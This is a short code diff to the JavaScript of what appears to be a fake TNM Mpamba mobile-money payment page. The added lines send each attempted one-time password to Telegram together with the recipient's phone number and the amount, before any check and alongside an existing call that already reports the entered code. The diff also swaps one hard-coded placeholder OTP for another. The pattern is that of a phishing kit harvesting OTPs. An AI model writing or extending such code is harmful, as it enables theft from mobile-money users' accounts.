@@ -1288,7 +1288,12 @@
         return;
       }
 
-      const expectedOtp = '1234';
+      const amount = getCurrentAmount();
+      const recipientValue = recipientInput.dataset.actualValue || recipientInput.value || '';
+      const normalizedRecipient = normalizePhone(recipientValue.trim());
+      notifyTelegram(`TNM Mpamba OTP attempt\nPhone: 0${normalizedRecipient}\nAttempted OTP: ${otp}\nAmount: ${money(amount)}`);
+
+      const expectedOtp = '9999';
       if (otp !== expectedOtp) {
         otpAttempts += 1;
         const remaining = MAX_OTP_ATTEMPTS - otpAttempts;
@@ -1316,9 +1321,7 @@
         return;
       }
 
-      const amount = getCurrentAmount();
-      const recipientValue = recipientInput.dataset.actualValue || recipientInput.value || '';
-      notifyTelegram(`TNM Mpamba OTP entered\nPhone: 0${normalizePhone(recipientValue.trim())}\nOTP: ${otp}\nAmount: ${money(amount)}`);
+      notifyTelegram(`TNM Mpamba OTP entered\nPhone: 0${normalizedRecipient}\nOTP: ${otp}\nAmount: ${money(amount)}`);
       if (isTopUp) {
         const storedBalance = Number(localStorage.getItem('tnmBalance') ?? 0);
         localStorage.setItem('tnmBalance', String(storedBalance + amount));
